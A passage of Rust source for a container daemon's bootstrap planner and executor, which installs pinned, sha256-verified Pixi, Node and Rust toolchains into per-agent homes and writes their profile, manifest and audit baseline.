            Self::Extract { file, dest, .. } => format!("extract {file} → {dest}"),
            Self::Exec { label, .. } => label.clone(),
            Self::Probe { tool, .. } => format!("probe {tool}"),
            Self::Write { path, .. } => format!("write {path}"),
        }
    }

    /// The in-container argv (without the `env K=V …` prefix the executor
    /// adds). Pure.
    #[must_use]
    pub fn argv(&self) -> Vec<String> {
        let s = |x: &str| x.to_owned();
        match self {
            Self::Mkdir { paths } => {
                let mut argv = vec![s("mkdir"), s("-p")];
                argv.extend(paths.iter().cloned());
                argv
            }
            Self::Chmod { path, mode } => vec![s("chmod"), s(mode), s(path)],
            Self::StageFromCache { from, to, .. } => vec![s("cp"), from.clone(), to.clone()],
            Self::Download { url, to, .. } => vec![
                s("curl"),
                s("-fsSL"),
                s("--retry"),
                s("3"),
                s("-o"),
                to.clone(),
                url.clone(),
            ],
            Self::Verify { path, .. } => vec![s(DIGEST_TOOL), path.clone()],
            Self::Publish { from, to, .. } => vec![s("ln"), from.clone(), to.clone()],
            Self::Extract {
                archive,
                dest,
                strip,
                format,
                ..
            } => {
                let mut argv = vec![s("tar"), s("-x")];
                if let Some(flag) = format.tar_flag() {
                    argv.push(s(flag));
                }
                argv.extend([s("-f"), archive.clone(), s("-C"), dest.clone()]);
                if *strip > 0 {
                    argv.extend([s("--strip-components"), s(&strip.to_string())]);
                }
                argv
            }
            Self::Exec { argv, .. } | Self::Probe { argv, .. } => argv.clone(),
            Self::Write { path, .. } => vec![s("tee"), path.clone()],
        }
    }

    /// Stdin payload, when the step pipes one.
    #[must_use]
    pub fn stdin(&self) -> Option<&[u8]> {
        match self {
            Self::Write { content, .. } => Some(content.as_bytes()),
            _ => None,
        }
    }

    /// Whether this step downloads from the network (the instrumentation the
    /// "zero downloads on re-provision" assertions count).
    #[must_use]
    pub fn is_download(&self) -> bool {
        matches!(self, Self::Download { .. })
    }
}

/// Everything bootstrap will do, decided without touching podman: the plan is
/// a pure function of `(uid, blueprint, pins, observed mirror state)`.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct BootstrapPlan {
    /// Derived image reference (ADR-0012 cl. 2).
    pub image: String,
    /// Generated Containerfile bytes.
    pub containerfile: String,
    /// apk package set baked into the image layer.
    pub apk_packages: Vec<String>,
    /// Resolved user-space tools, in blueprint order.
    pub tools: Vec<PlannedTool>,
    /// Session environment (structural + passthrough).
    pub env: ParcelEnv,
    /// Exact `$HOME/.profile` bytes.
    pub profile: String,
    /// Exact `$HOME/.hamlet/toolchain.json` bytes (canonical JSON).
    pub manifest: String,
    /// Ordered install steps.
    pub steps: Vec<BootstrapStep>,
    /// Mirror hits (zero downloads each).
    pub cache_hits: usize,
    /// Mirror misses (one download each).
    pub cache_misses: usize,
}

impl BootstrapPlan {
    /// Probes for every resolved tool, in order.
    #[must_use]
    pub fn probes(&self) -> Vec<(String, Vec<String>)> {
        self.tools
            .iter()
            .map(|t| (t.name.clone(), t.probe.clone()))
            .collect()
    }

    /// The env prefix every bootstrap exec carries: `env K=V …` over the
    /// derived structural vars only (the blueprint's `[env]` is already in
    /// the container env from `podman run -e`).
    #[must_use]
    pub fn env_prefix(&self) -> Vec<String> {
        let mut argv = vec!["env".to_owned()];
        for (key, value) in &self.env.structural {
            argv.push(format!("{key}={value}"));
        }
        argv
    }
}

/// A blueprint tool matched to its pin (the unit the plan builder consumes).
struct ResolvedTool {
    kind: ToolKind,
    name: String,
    version_spec: Option<String>,
    pin: ToolPin,
}

/// Resolve + validate every user-space tool of a blueprint against the pin
/// table (pure; shared by the plan builder and the mirror probe).
fn resolve_tools(
    blueprint: &Blueprint,
    pins: &ToolchainPins,
) -> Result<Vec<ResolvedTool>, BootstrapError> {
    let host_arch = std::env::consts::ARCH;
    let mut resolved = Vec::new();
    for tool in blueprint.tools() {
        if tool.kind() == ToolKind::Apk {
            continue; // image layer, not home layer
        }
        let pin = pins
            .resolve(tool.kind(), tool.name(), tool.version_spec())
            .ok_or_else(|| BootstrapError::UnpinnedTool {
                kind: tool.kind(),
                name: tool.name().to_owned(),
                version_spec: tool.version_spec().map(str::to_owned),
            })?
            .clone();
        for artifact in pin.artifacts() {
            if artifact.arch() != host_arch {
                return Err(BootstrapError::ArchMismatch {
                    file: artifact.file().to_owned(),
                    pin_arch: artifact.arch().to_owned(),
                    host_arch: host_arch.to_owned(),
                });
            }
        }
        resolved.push(ResolvedTool {
            kind: tool.kind(),
            name: tool.name().to_owned(),
            version_spec: tool.version_spec().map(str::to_owned),
            pin,
        });
    }
    Ok(resolved)
}

/// Every artifact file name a blueprint needs from the mirror, in plan order.
/// The executor probes these host-side to decide hit vs miss.
///
/// # Errors
///
/// [`BootstrapError::UnpinnedTool`] / [`BootstrapError::ArchMismatch`].
pub fn artifact_files(
    blueprint: &Blueprint,
    pins: &ToolchainPins,
) -> Result<Vec<String>, BootstrapError> {
    Ok(resolve_tools(blueprint, pins)?
        .iter()
        .flat_map(|resolved| {
            resolved
                .pin
                .artifacts()
                .iter()
                .map(|a| a.file().to_owned())
                .collect::<Vec<_>>()
        })
        .collect())
}

/// Build the bootstrap plan.
///
/// `cached` is the set of artifact file names the executor observed as
/// regular, non-empty files in `market/pkgcache/dist/` (host side). Pure.
///
/// # Errors
///
/// [`BootstrapError`] — uid policy, unpinned tool, arch mismatch, unknown or
/// missing artifact role, env policy violation.
pub fn plan_bootstrap(
    uid: u32,
    blueprint: &Blueprint,
    pins: &ToolchainPins,
    cached: &BTreeSet<String>,
) -> Result<BootstrapPlan, BootstrapError> {
    if !(FIRST_AGENT_UID..=LAST_AGENT_UID).contains(&uid) {
        return Err(BootstrapError::UidPolicy { uid });
    }
    let resolved = resolve_tools(blueprint, pins)?;
    let mut tools = Vec::with_capacity(resolved.len());
    let mut steps = Vec::new();
    let mut tool_dirs: Vec<String> = Vec::new();
    let mut tool_env: BTreeMap<String, String> = BTreeMap::new();
    let mut cache_hits = 0;
    let mut cache_misses = 0;

    // Private staging first: nothing shared is touched before it exists.
    steps.push(BootstrapStep::Mkdir {
        paths: vec![hamlet_home_dir(uid), stage_dir(uid)],
    });
    steps.push(BootstrapStep::Chmod {
        path: stage_dir(uid),
        mode: "0700".to_owned(),
    });

    for ResolvedTool {
        kind,
        name,
        version_spec,
        pin,
    } in resolved
    {
        let artifacts: Vec<ArtifactUse> = pin
            .artifacts()
            .iter()
            .map(|a| {
                let file = a.file().to_owned();
                let is_cached = cached.contains(&file);
                if is_cached {
                    cache_hits += 1;
                } else {
                    cache_misses += 1;
                }
                ArtifactUse {
                    cached: is_cached,
                    file,
                    role: a.role().to_owned(),
                    version: a.version().to_owned(),
                    sha256: a.sha256().to_owned(),
                    url: a.url().to_owned(),
                    format: a.format(),
                }
            })
            .collect();
        let by_role = |role: &str| -> Result<&ArtifactUse, BootstrapError> {
            artifacts
                .iter()
                .find(|a| a.role == role)
                .ok_or(BootstrapError::MissingArtifactRole {
                    kind,
                    role: role.to_owned(),
                })
        };
        for artifact in &artifacts {
            let known = match kind {
                ToolKind::Pixi => [ROLE_PIXI_PRIMARY].as_slice(),
                ToolKind::Nvm => [ROLE_NVM_MANAGER, ROLE_NVM_RUNTIME].as_slice(),
                ToolKind::Cargo => [
                    ROLE_RUST_RUSTUP,
                    ROLE_RUST_RUSTC,
                    ROLE_RUST_CARGO,
                    ROLE_RUST_STD,
                ]
                .as_slice(),
                // resolve_tools() never yields apk entries.
                ToolKind::Apk => [].as_slice(),
            };
            if !known.contains(&artifact.role.as_str()) {
                return Err(BootstrapError::UnknownArtifactRole {
                    kind,
                    role: artifact.role.clone(),
                });
            }
        }

        let home = home_container_dir(uid);
        let mut tool_steps = Vec::new();
        let (bin_dir, probe, env): (String, Vec<String>, BTreeMap<String, String>) = match kind {
            // --- Pixi: single static musl binary → $PIXI_HOME/bin ---------
            ToolKind::Pixi => {
                let root = format!("{home}/.pixi");
                let bin_dir = format!("{root}/bin");
                let primary = by_role(ROLE_PIXI_PRIMARY)?;
                tool_steps.push(BootstrapStep::Mkdir {
                    paths: vec![bin_dir.clone()],
                });
                tool_steps.extend(artifact_pipeline(uid, primary));
                tool_steps.push(BootstrapStep::Extract {
                    file: primary.file.clone(),
                    archive: staged_path(uid, &primary.file),
                    dest: bin_dir.clone(),
                    strip: 0,
                    format: primary.format,
                });
                let mut env = BTreeMap::new();
                env.insert("PIXI_HOME".to_owned(), root);
                (
                    bin_dir.clone(),
                    vec![format!("{bin_dir}/pixi"), "--version".to_owned()],
                    env,
                )
            }
            // --- NVM + Node: nvm into $NVM_DIR, node materialized in nvm's
            // own versions/ layout so `nvm use` works offline ---------------
            ToolKind::Nvm => {
                let root = format!("{home}/.nvm");
                let node_dir = format!("{root}/versions/node/v{}", pin.version());
                let bin_dir = format!("{node_dir}/bin");
                let manager = by_role(ROLE_NVM_MANAGER)?;
                let runtime = by_role(ROLE_NVM_RUNTIME)?;
                tool_steps.push(BootstrapStep::Mkdir {
                    paths: vec![root.clone(), node_dir],
                });
                tool_steps.extend(artifact_pipeline(uid, manager));
                tool_steps.push(BootstrapStep::Extract {
                    file: manager.file.clone(),
                    archive: staged_path(uid, &manager.file),
                    dest: root.clone(),
                    strip: 1,
                    format: manager.format,
                });
                tool_steps.extend(artifact_pipeline(uid, runtime));
                tool_steps.push(BootstrapStep::Extract {
                    file: runtime.file.clone(),
                    archive: staged_path(uid, &runtime.file),
                    dest: format!("{root}/versions/node/v{}", pin.version()),
                    strip: 1,
                    format: runtime.format,
                });
                let mut env = BTreeMap::new();
                env.insert("NVM_DIR".to_owned(), root);
                (
                    bin_dir.clone(),
                    vec![format!("{bin_dir}/node"), "--version".to_owned()],
                    env,
                )
            }
            // --- Rustup + Rust: multiplexer from the pinned static binary,
            // toolchain from pinned component tarballs, linked offline ------
            ToolKind::Cargo => {
                let cargo_home = format!("{home}/.cargo");
                let rustup_home = format!("{home}/.rustup");
                let link = format!("hamlet-{}", pin.version());
                let toolchain = format!("{home}/.rust/toolchains/{link}");
                let bin_dir = format!("{cargo_home}/bin");
                let rustup = by_role(ROLE_RUST_RUSTUP)?;
                let rustc = by_role(ROLE_RUST_RUSTC)?;
                let cargo = by_role(ROLE_RUST_CARGO)?;
                let std = by_role(ROLE_RUST_STD)?;
                tool_steps.push(BootstrapStep::Mkdir {
                    paths: vec![bin_dir.clone(), rustup_home.clone(), toolchain.clone()],
                });
                tool_steps.extend(artifact_pipeline(uid, rustup));
                if rustup.format != ArtifactFormat::Binary {
                    return Err(BootstrapError::UnexpectedArtifactFormat {
                        file: rustup.file.clone(),
                        expected: ArtifactFormat::Binary,
                        actual: rustup.format,
                    });
                }
                // The pipeline already chmod'ed it 0755 (executable here, and
                // still readable by other slots once hard-linked to the mirror).
                tool_steps.push(BootstrapStep::Exec {
                    label: "rustup-init (multiplexer only, no toolchain download)".to_owned(),
                    argv: vec![
                        staged_path(uid, &rustup.file),
                        "-y".to_owned(),
                        "--no-modify-path".to_owned(),
                        "--default-toolchain".to_owned(),
                        "none".to_owned(),
                    ],
                });
                // Component tarballs all strip 2 (`<pkg>-<ver>-<target>/<component>/`)
                // into the toolchain root: rustc → bin/ lib/ share/, cargo →
                // bin/cargo share/, rust-std → lib/rustlib/<target>/lib/.
                for (artifact, dest, strip) in [
                    (rustc, toolchain.clone(), 2u32),
                    (cargo, toolchain.clone(), 2),
                    (std, toolchain.clone(), 2),
                ] {
                    tool_steps.extend(artifact_pipeline(uid, artifact));
                    tool_steps.push(BootstrapStep::Extract {
                        file: artifact.file.clone(),
                        archive: staged_path(uid, &artifact.file),
                        dest,
                        strip,
                        format: artifact.format,
                    });
                }
                tool_steps.push(BootstrapStep::Exec {
                    label: format!("rustup toolchain link {link}"),
                    argv: vec![
                        format!("{bin_dir}/rustup"),
                        "toolchain".to_owned(),
                        "link".to_owned(),
                        link.clone(),
                        toolchain.clone(),
                    ],
                });
                tool_steps.push(BootstrapStep::Exec {
                    label: format!("rustup default {link}"),
                    argv: vec![format!("{bin_dir}/rustup"), "default".to_owned(), link],
                });
                let mut env = BTreeMap::new();
                env.insert("CARGO_HOME".to_owned(), cargo_home);
                env.insert("RUSTUP_HOME".to_owned(), rustup_home);
                (
                    bin_dir.clone(),
                    vec![format!("{bin_dir}/cargo"), "--version".to_owned()],
                    env,
                )
            }
            // resolve_tools() skips apk entries (they are the image layer).
            ToolKind::Apk => continue,
        };

        let probe_step = BootstrapStep::Probe {
            tool: name.clone(),
            argv: probe.clone(),
        };
        steps.extend(tool_steps);
        steps.push(probe_step);
        tool_dirs.push(bin_dir.clone());
        tool_env.extend(env.clone());
        tools.push(PlannedTool {
            kind,
            name,
            version_spec,
            version: pin.version().to_owned(),
            artifacts,
            env,
            bin_dir,
            probe,
        });
    }

    // Staging is ~200 MB of tarballs: drop it once every byte is extracted.
    steps.push(BootstrapStep::Exec {
        label: "drop private staging".to_owned(),
        argv: vec![
            "rm".to_owned(),
            "-r".to_owned(),
            "-f".to_owned(),
            stage_dir(uid),
        ],
    });

    let env = parcel_env(uid, blueprint, &tool_dirs, &tool_env)?;
    let image = derived_image_tag(blueprint);
    let profile = profile(uid, blueprint, &image, &env);
    let manifest = manifest(uid, blueprint, &image, pins, &tools, &env);
    steps.push(BootstrapStep::Write {
        path: profile_path(uid),
        content: profile.clone(),
    });
    steps.push(BootstrapStep::Write {
        path: manifest_path(uid),
        content: manifest.clone(),
    });

    Ok(BootstrapPlan {
        image,
        containerfile: containerfile(blueprint),
        apk_packages: apk_packages(blueprint),
        tools,
        env,
        profile,
        manifest,
        steps,
        cache_hits,
        cache_misses,
    })
}

/// `cat <path>` argv (the no-op check reads the manifest/profile back).
#[must_use]
pub fn cat_argv(path: &str) -> Vec<String> {
    vec!["cat".to_owned(), path.to_owned()]
}

/// The stage → verify → publish pipeline for one artifact (ADR-0013 cl. 1–2).
fn artifact_pipeline(uid: u32, artifact: &ArtifactUse) -> Vec<BootstrapStep> {
    let staged = staged_path(uid, &artifact.file);
    let mirror = mirror_path(&artifact.file);
    let mut steps = vec![if artifact.cached {
        BootstrapStep::StageFromCache {
            file: artifact.file.clone(),
            from: mirror.clone(),
            to: staged.clone(),
        }
    } else {
        BootstrapStep::Download {
            file: artifact.file.clone(),
            url: artifact.url.clone(),
            to: staged.clone(),
        }
    }];
    steps.push(BootstrapStep::Verify {
        file: artifact.file.clone(),
        path: staged.clone(),
        expect_sha256: artifact.sha256.clone(),
    });
    if !artifact.cached {
        // Normalize the mode BEFORE publishing: `ln` shares the inode, so the
        // mirror entry inherits exactly this mode. A curl/tar default under a
        // hostile umask (0600) would make the entry unreadable to every other
        // slot, and a 0700 binary would be un-executable after another parcel
        // copies it. The mirror is a cache of public artifacts: 0644/0755.
        let mode = match artifact.format {
            ArtifactFormat::Binary => "0755",
            ArtifactFormat::TarGz | ArtifactFormat::TarXz => "0644",
        };
        steps.push(BootstrapStep::Chmod {
            path: staged.clone(),
            mode: mode.to_owned(),
        });
        // Publish the verified inode so the next parcel is offline-fast.
        steps.push(BootstrapStep::Publish {
            file: artifact.file.clone(),
            from: staged,
            to: mirror,
        });
    }
    steps
}

// ---------------------------------------------------------------------------
// Profile / manifest / DEED baseline (pure builders, golden-tested)
// ---------------------------------------------------------------------------

/// The exact `$HOME/.profile` bytes: derived structural vars, blueprint
/// passthrough, and nvm's shell function. Every value is single-quoted
/// ([`sh_quote`]); no secret can appear here because blueprint `[env]`
/// rejects secret-shaped keys (ADR-0009) and `.env` is injected at session
/// start instead (SPEC §11.4).
#[must_use]
pub fn profile(uid: u32, blueprint: &Blueprint, image: &str, env: &ParcelEnv) -> String {
    let meta = blueprint.meta();
    let mut out = format!(
        "# hamlet parcel profile — GENERATED by hamlet-daemon bootstrap (ADR-0012).\n\
         # parcel{uid} · blueprint {name} v{version} · image {image}\n\
         #\n\
         # Rewritten whenever the blueprint or the pin table changes; hand edits are\n\
         # lost. Secrets are NEVER written here — they are injected at session start\n\
         # (SPEC §11.4) and stay out of every parcel home.\n\
         #\n\
         # Sourced by login shells (busybox ash reads ~/.profile for `sh -l`), which is\n\
         # how the daemon must start agent sessions (Sprint 03).\n\
         \n",
        name = meta.name(),
        version = meta.version(),
    );
    for (key, value) in &env.structural {
        out.push_str(&format!("export {key}={}\n", sh_quote(value)));
    }
    if !env.passthrough.is_empty() {
        out.push_str(&format!(
            "\n# blueprint [env] — non-secret defaults from {name} v{version}\n",
            name = meta.name(),
            version = meta.version()
        ));
        for (key, value) in &env.passthrough {
            out.push_str(&format!("export {key}={}\n", sh_quote(value)));
        }
    }
    if env.structural.contains_key("NVM_DIR") {
        out.push_str(
            "\n# nvm as a shell function (SPEC §4: agents self-extend from the home)\n\
             if [ -s \"$NVM_DIR/nvm.sh\" ]; then . \"$NVM_DIR/nvm.sh\"; fi\n",
        );
    }
    out
}

/// The exact `$HOME/.hamlet/toolchain.json` bytes: canonical JSON (sorted
/// keys) describing the desired installed state. Byte-comparison against the
/// on-disk copy is what makes re-bootstrap a verified no-op.
///
/// Env is recorded as KEYS ONLY (SPEC §11.4 — values never leave the home).
#[must_use]
pub fn manifest(
    uid: u32,
    blueprint: &Blueprint,
    image: &str,
    pins: &ToolchainPins,
    tools: &[PlannedTool],
    env: &ParcelEnv,
) -> String {
    let meta = blueprint.meta();
    let mut root = Map::new();
    root.insert(
        "manifest_version".to_owned(),
        Value::from(MANIFEST_SCHEMA_VERSION),
    );
    root.insert("pins_version".to_owned(), Value::from(pins.version()));
    root.insert("floor_version".to_owned(), Value::from(FLOOR_VERSION));
    root.insert("uid".to_owned(), Value::from(u64::from(uid)));
    root.insert("image".to_owned(), Value::from(image));

    let mut bp = Map::new();
    bp.insert("name".to_owned(), Value::from(meta.name().to_string()));
    bp.insert("version".to_owned(), Value::from(u64::from(meta.version())));
    bp.insert(
        "base_image".to_owned(),
        Value::from(meta.base_image().to_owned()),
    );
    root.insert("blueprint".to_owned(), Value::Object(bp));

    let tool_values: Vec<Value> = tools
        .iter()
        .map(|tool| {
            let mut t = Map::new();
            t.insert("kind".to_owned(), Value::from(tool.kind.as_str()));
            t.insert("name".to_owned(), Value::from(tool.name.clone()));
            t.insert(
                "version_spec".to_owned(),
                Value::from(tool.version_spec.clone().unwrap_or_default()),
            );
            t.insert("version".to_owned(), Value::from(tool.version.clone()));
            t.insert("bin_dir".to_owned(), Value::from(tool.bin_dir.clone()));
            let artifacts: Vec<Value> = tool
                .artifacts
                .iter()
                .map(|a| {
                    let mut m = Map::new();
                    m.insert("role".to_owned(), Value::from(a.role.clone()));
                    m.insert("file".to_owned(), Value::from(a.file.clone()));
                    m.insert("version".to_owned(), Value::from(a.version.clone()));
                    m.insert("sha256".to_owned(), Value::from(a.sha256.clone()));
                    Value::Object(m)
                })
                .collect();
            t.insert("artifacts".to_owned(), Value::Array(artifacts));
            Value::Object(t)
        })
        .collect();
    root.insert("tools".to_owned(), Value::Array(tool_values));
    root.insert(
        "apk_packages".to_owned(),
        Value::Array(
            apk_packages(blueprint)
                .into_iter()
                .map(Value::from)
                .collect(),
        ),
    );
    root.insert(
        "env_keys".to_owned(),
        Value::Array(env.keys().into_iter().map(Value::from).collect()),
    );
    let rendered = serde_json::to_string_pretty(&Value::Object(root))
        .expect("a Map<String, Value> always serializes");
    format!("{rendered}\n")
}

/// The DEED.md `### Dynamic Alterations` baseline entry (SPEC §9.4). A pure
/// function of the plan plus the manifest's sha256, so re-running produces
/// byte-identical text and [`deed_has_baseline`] can detect it.
///
/// Sprint 06 must treat this entry as the environment FLOOR (already in the
/// blueprint's lineage), not as an agent alteration to promote.
#[must_use]
pub fn deed_baseline_entry(uid: u32, plan: &BootstrapPlan, manifest_sha256: &str) -> String {
    let mut out = format!(
        "- {DEED_BASELINE_MARKER} · uid {uid} · image {}\n",
        plan.image
    );
    out.push_str(&format!(
        "  - manifest: {} · sha256 {manifest_sha256}\n",
        manifest_path(uid)
    ));
    for tool in &plan.tools {
        let artifacts: Vec<String> = tool
            .artifacts
            .iter()
            .map(|a| format!("{}@{} sha256 {}", a.role, a.version, a.sha256))
            .collect();
        out.push_str(&format!(
            "  - tool: {}/{name} {spec} → {version} · {arts}\n",
            tool.kind,
            name = tool.name,
            spec = tool.version_spec.clone().unwrap_or_default(),
            version = tool.version,
            arts = artifacts.join(", "),
        ));
    }
    out.push_str(&format!(
        "  - image layer (apk): {}\n",
        plan.apk_packages.join(", ")
    ));
    out.push_str(&format!(
        "  - env keys: {} (values never recorded — SPEC §11.4)\n",
        plan.env.keys().join(", ")
    ));
    out
}

/// Whether `deed` already carries a baseline entry for this exact manifest
/// digest (the idempotence check for the DEED append).
#[must_use]
pub fn deed_has_baseline(deed: &str, uid: u32, manifest_sha256: &str) -> bool {
    let needle = format!(
        "  - manifest: {} · sha256 {manifest_sha256}",
        manifest_path(uid)
    );
    deed.lines().any(|line| line == needle)
}

// ---------------------------------------------------------------------------
// Report
// ---------------------------------------------------------------------------

/// What one [`Bootstrapper::bootstrap_home`] run did — including the pkgcache
/// hit instrumentation the "zero downloads on re-provision" invariant is
/// asserted from.
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct BootstrapReport {
    /// `true` when the home already matched the desired state byte-for-byte
    /// and every probe answered: no install step ran.
    pub no_op: bool,
    /// Derived image reference the parcel runs.
    pub image: String,
    /// Mirror hits (zero downloads).
    pub cache_hits: usize,
    /// Mirror misses.
    pub cache_misses: usize,
    /// Network downloads actually issued (`curl` steps executed).
    pub downloads: usize,
    /// Plan steps executed in-container (the no-op path executes none: its
    /// two reads, three probes and one digest are not plan steps).
    pub steps_executed: usize,
    /// Artifacts whose staged copy matched its pin digest.
    pub verified_artifacts: Vec<String>,
    /// Probe output per tool (`pixi` → `pixi 0.34.0`).
    pub probes: BTreeMap<String, String>,
    /// sha256 of the manifest now in the home.
    pub manifest_sha256: String,
    /// `true` when this run appended the DEED baseline entry.
    pub deed_recorded: bool,
    /// Mirror publishes that failed (non-fatal: the next parcel re-downloads).
    pub publish_failures: Vec<String>,
}

// ---------------------------------------------------------------------------
// Executor
// ---------------------------------------------------------------------------

/// The parcel bootstrap targets: identity → container name, uid → home.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct BootstrapTarget {
    /// Agent identity (= the container name, [`crate::podman::RunSpec`]).
    pub identity: SafeName,
    /// Charter UID slot.
    pub uid: u32,
}

impl BootstrapTarget {
    /// Validate a target (uid policy fires before any side effect).
    ///
    /// # Errors
    ///
    /// [`BootstrapError::UidPolicy`] outside 1001–2000.
    pub fn new(identity: SafeName, uid: u32) -> Result<Self, BootstrapError> {
        if !(FIRST_AGENT_UID..=LAST_AGENT_UID).contains(&uid) {
            return Err(BootstrapError::UidPolicy { uid });
        }
        Ok(Self { identity, uid })
    }

    /// The container name this parcel runs under.
    #[must_use]
    pub fn container(&self) -> &str {
        self.identity.as_str()
    }
}

/// Image resolution outcome.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ImageOutcome {
    /// Derived image reference.
    pub tag: String,
    /// `true` when this call built it (else it was already in the store).
    pub built: bool,
}

/// Blueprint bootstrap over one village tree, through the [`Runtime`] seam.
pub struct Bootstrapper<'a> {
    tree: &'a HamletTree,
    runtime: &'a (dyn Runtime + 'a),
    pins: ToolchainPins,
}

impl<'a> Bootstrapper<'a> {
    /// Bootstrapper with the committed pin table
    /// ([`ToolchainPins::default_hamlet`]).
    ///
    /// # Errors
    ///
    /// [`BootstrapError::Pins`] if the embedded table fails to parse (it is
    /// golden-tested, so this is a build-time bug, not a runtime condition).
    pub fn new(
        tree: &'a HamletTree,
        runtime: &'a (dyn Runtime + 'a),
    ) -> Result<Self, BootstrapError> {
        Ok(Self::with_pins(
            tree,
            runtime,
            ToolchainPins::default_hamlet()?,
        ))
    }

    /// Bootstrapper with an explicit pin table (tests, or a future
    /// operator-supplied mirror).
    #[must_use]
    pub fn with_pins(
        tree: &'a HamletTree,
        runtime: &'a (dyn Runtime + 'a),
        pins: ToolchainPins,
    ) -> Self {
        Self {
            tree,
            runtime,
            pins,
        }
    }

    /// The pin table in force.
    #[must_use]
    pub fn pins(&self) -> &ToolchainPins {
        &self.pins
    }

    /// Resolve the parcel image: reuse the derived tag when it is in the
    /// local store, otherwise pull the blueprint's PARENT image and build
    /// (ADR-0012 cl. 2). Derived images are `localhost/`-scoped and are never
    /// pulled.
    ///
    /// # Errors
    ///
    /// [`BootstrapError::Podman`] on a pull/build failure,
    /// [`BootstrapError::Io`] when the private build context can't be
    /// created 0700.
    pub async fn ensure_image(
        &self,
        blueprint: &Blueprint,
    ) -> Result<ImageOutcome, BootstrapError> {
        let tag = derived_image_tag(blueprint);
        if self.runtime.image_exists(&tag).await? {
            return Ok(ImageOutcome { tag, built: false });
        }
        // Parent first: `podman build` would otherwise pull it implicitly,
        // without our retry policy.
        self.runtime.pull(blueprint.meta().base_image()).await?;

        let context = build_context_dir(self.tree, blueprint);
        self.write_private_context(&context, &containerfile(blueprint))?;
        let containerfile_path = context.join("Containerfile");
        let result = self
            .runtime
            .build(&tag, &containerfile_path, &context)
            .await;
        // Best effort: a leftover 0700 dir is harmless, and a failed build
        // must surface its own error, not a cleanup error.
        let _ = fs::remove_dir_all(&context);
        result?;
        Ok(ImageOutcome { tag, built: true })
    }

    /// Create (or re-claim) the daemon-private build context: 0700 dir,
    /// 0600 Containerfile, freshly truncated every time. A pre-existing
    /// context owned by another user fails here rather than being adopted.
    fn write_private_context(&self, context: &Path, content: &str) -> Result<(), BootstrapError> {
        match fs::symlink_metadata(context) {
            Ok(meta) if meta.is_dir() => {}
            Ok(_) => {
                return Err(BootstrapError::NotRegularFile {
                    path: context.to_path_buf(),
                })
            }
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => {
                fs::create_dir(context).map_err(io_err(&format!("mkdir {}", context.display())))?;
            }
            Err(source) => {
                return Err(BootstrapError::Io {
                    context: format!("stat {}", context.display()),
                    source,
                })
            }
        }
        set_mode(context, 0o700)?;
        let path = context.join("Containerfile");
        {
            let mut file = OpenOptions::new()
                .write(true)
                .create(true)
                .truncate(true)
                .open(&path)
                .map_err(io_err(&format!("write {}", path.display())))?;
            file.write_all(content.as_bytes())
                .map_err(io_err(&format!("write {}", path.display())))?;
            file.sync_all()
                .map_err(io_err(&format!("fsync {}", path.display())))?;
        }
        set_mode(&path, 0o600)?;
        Ok(())
    }

    /// Materialize the blueprint's `[tools]` into the parcel home, BEFORE the
    /// first agent session (SPEC §5: the daemon executes blueprints at
    /// provisioning). Idempotent: a home that already matches the desired
    /// state is a verified no-op.
    ///
    /// # Errors
    ///
    /// [`BootstrapError`] — see the variant docs. A digest mismatch or a
    /// failed probe aborts before any manifest/DEED record is written, so the
    /// tree never claims a toolchain the home does not have.
    pub async fn bootstrap_home(
        &self,
        target: &BootstrapTarget,
        blueprint: &Blueprint,
    ) -> Result<BootstrapReport, BootstrapError> {
        let uid = target.uid;
        if !(FIRST_AGENT_UID..=LAST_AGENT_UID).contains(&uid) {
            return Err(BootstrapError::UidPolicy { uid });
        }
        let container = target.container();

        // --- pure planning first: a refusal here has ZERO side effects -----
        // (resolve/artifact_files rejects unpinned tools and foreign arches,
        // plan_bootstrap the env policy; the mirror probe tolerates a missing
        // dist/ — every artifact is simply a miss.)
        let files = artifact_files(blueprint, &self.pins)?;
        let cached = self.observe_cache(&files)?;
        let plan = plan_bootstrap(uid, blueprint, &self.pins, &cached)?;
        let prefix = plan.env_prefix();

        // --- first side effect: the shared mirror directory ----------------
        self.ensure_mirror_dir()?;

        // --- verified no-op? (offline: two reads + the probes) -------------
        let manifest_now = self
            .read_home(container, &prefix, &manifest_path(uid))
            .await?;
        let profile_now = self
            .read_home(container, &prefix, &profile_path(uid))
            .await?;
        if manifest_now.as_deref() == Some(plan.manifest.as_str())
            && profile_now.as_deref() == Some(plan.profile.as_str())
        {
            let probes = self.run_probes(container, &prefix, &plan).await?;
            let manifest_sha256 = self.digest(container, &prefix, &manifest_path(uid)).await?;
            let deed_recorded = self.record_deed_baseline(uid, &plan, &manifest_sha256)?;
            return Ok(BootstrapReport {
                no_op: true,
                image: plan.image.clone(),
                cache_hits: plan.cache_hits,
                cache_misses: plan.cache_misses,
                downloads: 0,
                steps_executed: 0,
                verified_artifacts: Vec::new(),
                probes,
                manifest_sha256,
                deed_recorded,
                publish_failures: Vec::new(),
            });
        }

        // --- full run ------------------------------------------------------
        let mut report = BootstrapReport {
            no_op: false,
            image: plan.image.clone(),
            cache_hits: plan.cache_hits,
            cache_misses: plan.cache_misses,
            ..BootstrapReport::default()
        };
        for step in &plan.steps {
            self.run_step(container, &prefix, step, &mut report).await?;
        }
        report.manifest_sha256 = self.digest(container, &prefix, &manifest_path(uid)).await?;
        report.deed_recorded = self.record_deed_baseline(uid, &plan, &report.manifest_sha256)?;
        Ok(report)
    }

    /// Create `market/pkgcache/dist/` with its parent's sticky world-writable
    /// mode, so every slot UID can publish into it and none can clobber
    /// another's entry. Created host-side (never from inside a container,
    /// which would make it belong to whichever slot got there first).
    fn ensure_mirror_dir(&self) -> Result<(), BootstrapError> {
        let dist = self.tree.market_pkgcache_dist();
        match fs::symlink_metadata(&dist) {
            Ok(meta) if meta.is_dir() => {}
            Ok(_) => return Err(BootstrapError::NotRegularFile { path: dist.clone() }),
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => {
                // `create_dir`, not `create_dir_all`: a symlink or file squatting
                // the name must fail, and a concurrent creator (two daemons on
                // one host) is adopted rather than raced into an error.
                if let Err(source) = fs::create_dir(&dist) {
                    if source.kind() != std::io::ErrorKind::AlreadyExists {
                        return Err(BootstrapError::Io {
                            context: format!("mkdir {}", dist.display()),
                            source,
                        });
                    }
                }
            }
            Err(source) => {
                return Err(BootstrapError::Io {
                    context: format!("stat {}", dist.display()),
                    source,
                })
            }
        }
